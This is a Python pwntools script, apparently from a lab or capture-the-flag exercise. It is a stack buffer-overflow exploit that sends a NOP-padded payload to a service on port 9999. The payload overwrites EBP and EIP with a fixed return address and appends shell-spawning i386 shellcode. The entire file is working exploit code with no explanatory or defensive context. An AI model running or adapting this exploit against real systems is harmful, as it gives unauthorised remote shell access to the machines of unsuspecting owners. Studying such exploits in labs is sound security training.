from pwn import *
import struct

ip = "127.0.0.1"
#ip = '10.10.12.228'

context.update(arch='i386', os='linux')

shellcode = shellcraft.sh()
#print(shellcode)
shellcode = asm(shellcode)
#print(hexdump(shellcode))

shellcode_len = len(shellcode)
padding_len = 520
offset = b"C" * 4
nop = b'\x90'
nop_slide_len = 32
padding = nop * 520
ebp = p32(0xeeeeeeee)
eip = p32(0xdeadbeef)
eip = p32(0x0042f870)
payload = padding + ebp + eip

payload = nop * padding_len + ebp + eip + offset + nop * nop_slide_len + shellcode

r = remote(ip, 9999)
r.recv()

r.send(payload)
resp = r.recv(timeout=1.5)

print(resp)
r.close()